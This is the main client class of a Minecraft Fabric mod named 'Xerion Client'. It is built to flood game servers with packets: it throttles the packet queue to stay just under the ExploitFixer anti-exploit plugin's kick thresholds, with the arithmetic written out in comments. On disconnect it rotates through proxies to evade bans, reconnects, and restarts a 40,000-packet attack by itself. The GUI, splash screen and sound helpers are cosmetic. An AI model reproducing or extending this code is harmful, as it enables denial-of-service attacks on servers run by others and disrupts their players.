package com.professor.client;

import com.professor.client.exploit.ExploitLogger;
import com.professor.client.gui.ProfessorMusicManager;
import com.professor.client.gui.ProfessorScreen;
import com.professor.client.gui.ProfessorSplashScreen;
import com.professor.client.gui.XerionTitleScreen;
import com.professor.client.proxy.ProxyManager;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientLifecycleEvents;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.fabric.api.client.screen.v1.ScreenEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.screen.TitleScreen;
import net.minecraft.client.network.ServerAddress;
import net.minecraft.client.network.ServerInfo;
import net.minecraft.client.option.KeyBinding;
import net.minecraft.client.sound.PositionedSoundInstance;
import net.minecraft.client.util.InputUtil;
import net.minecraft.network.packet.Packet;
import net.minecraft.util.Identifier;
import org.lwjgl.glfw.GLFW;

import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.concurrent.ConcurrentLinkedQueue;

public class ProfessorClientMod implements ClientModInitializer {

    public static KeyBinding openGuiKey;
    public static final String MOD_ID    = "professorclient";
    public static final String CLIENT_NAME = "Xerion Client";

    // ── Last server info (needed for auto-reconnect) ──────────────────────
    public static volatile String lastServerHost = "";
    public static volatile int    lastServerPort = 25565;
    public static volatile String lastServerName = "Server";

    // ── Reconnect state ───────────────────────────────────────────────────
    private static volatile boolean pendingReconnect = false;
    private static volatile int     reconnectDelay   = 0;
    private static volatile int     reconnectCount   = 0;
    public  static volatile boolean attackActive     = false;
    public  static volatile int     attackN          = 40000;
    public  static volatile int     attackBypass     = 10; // EXFIX default

    // ── Packet queue (ExploitFixer bypass) ───────────────────────────────
    // TeleportConfirm: VL=0.01 → 2000/sec = 20VL/sec = exactly the reduce rate → net 0 VL
    // Movement: VL=0.2 → cap 80/sec = 16VL/sec < reduce → always safe
    // EF cancel=25VL · kick=100VL · PPS-hard=4096/sec
    public static final ConcurrentLinkedQueue<Packet<?>> PACKET_QUEUE = new ConcurrentLinkedQueue<>();
    public static volatile int PACKETS_PER_TICK = 100; // 2000/sec (EXFIX default)

    // ── Swing rate-limiter (EF: 100ms cooldown) ───────────────────────────
    private static long lastSwingMs = 0;
    public  static volatile int SWING_COOLDOWN_MS = 105;

    @Override
    public void onInitializeClient() {

        // ── Splash on startup ─────────────────────────────────────────────
        ClientLifecycleEvents.CLIENT_STARTED.register(client ->
            client.execute(() -> client.setScreen(new ProfessorSplashScreen())));

        // ── M key → open GUI ─────────────────────────────────────────────
        openGuiKey = KeyBindingHelper.registerKeyBinding(new KeyBinding(
            "key.professorclient.open_gui",
            InputUtil.Type.KEYSYM,
            GLFW.GLFW_KEY_M,
            "category.professorclient.general"
        ));

        // ── Tick loop ─────────────────────────────────────────────────────
        ClientTickEvents.END_CLIENT_TICK.register(client -> {

            // Open GUI on M
            while (openGuiKey.wasPressed()) {
                if (client.player != null) {
                    playSound(client, "hello_friend");
                    client.setScreen(new ProfessorScreen());
                }
            }

            // Drain packet queue at controlled rate (EF bypass)
            if (!PACKET_QUEUE.isEmpty() && client.getNetworkHandler() != null) {
                int sent = 0;
                while (!PACKET_QUEUE.isEmpty() && sent < PACKETS_PER_TICK) {
                    Packet<?> pkt = PACKET_QUEUE.poll();
                    if (pkt != null) {
                        try { client.getNetworkHandler().sendPacket(pkt); }
                        catch (Exception ignored) {}
                        sent++;
                    }
                }
            }

            // Store last server address every tick
            if (client.getCurrentServerEntry() != null) {
                ServerInfo si = client.getCurrentServerEntry();
                lastServerName = si.name;
                ServerAddress sa = ServerAddress.parse(si.address);
                lastServerHost = sa.getAddress();
                lastServerPort = sa.getPort();
            }

            // Pending reconnect countdown
            if (pendingReconnect) {
                if (--reconnectDelay <= 0) {
                    pendingReconnect = false;
                    doReconnect(client);
                }
            }
        });

        // ── Disconnect → proxy-rotate + auto-reconnect ────────────────────
        ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
            PACKET_QUEUE.clear();
            ExploitLogger.warn("DISCONNECT",
                "Disconnected from " + lastServerHost + ":" + lastServerPort);

            if (!ProxyManager.shouldAlwaysRotate() || lastServerHost.isEmpty()) return;

            ProxyManager.ProxyEntry next = ProxyManager.rotate();
            reconnectCount++;
            pendingReconnect = true;
            reconnectDelay   = 40; // ~2 seconds

            ExploitLogger.info("PROXY",
                "Rotated to #" + ProxyManager.getCurrent() +
                ": " + (next != null ? next.host() : "direct") +
                " | Reconnect #" + reconnectCount);
        });

        // ── Screen events: replace TitleScreen with XerionTitleScreen ─────
        ScreenEvents.AFTER_INIT.register((client, screen, w, h) -> {

            // Only replace the EXACT vanilla TitleScreen (not subclasses)
            if (screen.getClass() == TitleScreen.class) {
                client.execute(() -> {
                    try { ProfessorMusicManager.playOnTitleScreen(client); }
                    catch (Exception ignored) {}
                    client.setScreen(new XerionTitleScreen());
                });
                return;
            }

            // After proxy-reconnect: restart flood automatically
            if (attackActive
                    && client.player != null
                    && client.getNetworkHandler() != null
                    && !(screen instanceof TitleScreen)
                    && !(screen instanceof XerionTitleScreen)) {
                attackActive = false;
                ProfessorScreen.scheduleAttack(attackN, attackBypass);
                ExploitLogger.info("AUTO-ATTACK",
                    "Restarted attack after reconnect (" + attackN + " pkts)");
            }
        });
    }

    // ── Reconnect to last server via reflection (avoids ConnectScreen import) ─
    // ConnectScreen is in net.minecraft.client.gui.screen but Yarn mapping name
    // varies; reflection finds it regardless of what it's called at runtime.
    private static void doReconnect(MinecraftClient client) {
        if (lastServerHost.isEmpty()) return;
        try {
            ProxyManager.applyProxy(ProxyManager.getCurrentEntry());

            ServerAddress addr = new ServerAddress(lastServerHost, lastServerPort);
            ServerInfo    info = new ServerInfo(lastServerName,
                lastServerHost + ":" + lastServerPort, ServerInfo.ServerType.OTHER);

            Screen parent = new XerionTitleScreen();

            // Try every known class name / package for ConnectScreen across MC versions
            String[] candidates = {
                "net.minecraft.client.gui.screen.ConnectScreen",
                "net.minecraft.client.gui.screen.multiplayer.ConnectScreen",
                "net.minecraft.class_408"
            };
            for (String cls : candidates) {
                try {
                    Class<?> cc = Class.forName(cls);
                    for (Method m : cc.getMethods()) {
                        if (Modifier.isStatic(m.getModifiers()) &&
                            (m.getName().equals("connect") || m.getName().startsWith("method_"))) {
                            try {
                                // Try 6-arg signature (most common in 1.21.x)
                                m.invoke(null, parent, client, addr, info, false, null);
                                ExploitLogger.success("RECONNECT",
                                    "Connected via " + cls + "#" + m.getName());
                                return;
                            } catch (Exception ignored) {}
                        }
                    }
                } catch (ClassNotFoundException ignored) {}
            }

            // Fallback: go to Xerion title screen (user sees reconnect button)
            XerionTitleScreen.pendingReconnect = true;
            XerionTitleScreen.pendingReconnectAddress = lastServerHost + ":" + lastServerPort;
            XerionTitleScreen.pendingReconnectName    = lastServerName;
            client.execute(() -> client.setScreen(parent));
            ExploitLogger.warn("RECONNECT",
                "Auto-connect unavailable — reconnect button shown on title screen");

        } catch (Exception e) {
            ExploitLogger.error("RECONNECT", "doReconnect failed: " + e.getMessage());
        }
    }

    // ── Sound helpers ─────────────────────────────────────────────────────
    public static void playSound(MinecraftClient client, String name) {
        try {
            var reg = net.minecraft.registry.Registries.SOUND_EVENT;
            var id  = Identifier.of(MOD_ID, name);
            if (reg.containsId(id))
                client.getSoundManager().play(PositionedSoundInstance.master(reg.get(id), 1f, 1f));
        } catch (Exception ignored) {}
    }

    public static void playClickSound(MinecraftClient client) {
        try {
            var reg = net.minecraft.registry.Registries.SOUND_EVENT;
            var id  = Identifier.of("minecraft", "block.note_block.pling");
            if (reg.containsId(id))
                client.getSoundManager().play(PositionedSoundInstance.master(reg.get(id), 1.8f, 0.45f));
        } catch (Exception ignored) {}
    }

    // ── Queue / swing helpers ─────────────────────────────────────────────
    public static void queuePacket(Packet<?> pkt) { PACKET_QUEUE.offer(pkt); }
    public static void clearQueue()               { PACKET_QUEUE.clear(); }

    /** Swing rate-limiter respecting ExploitFixer 100ms cooldown */
    public static boolean canSwing() {
        long now = System.currentTimeMillis();
        if (now - lastSwingMs >= SWING_COOLDOWN_MS) { lastSwingMs = now; return true; }
        return false;
    }

    public static int getReconnectCount() { return reconnectCount; }
}
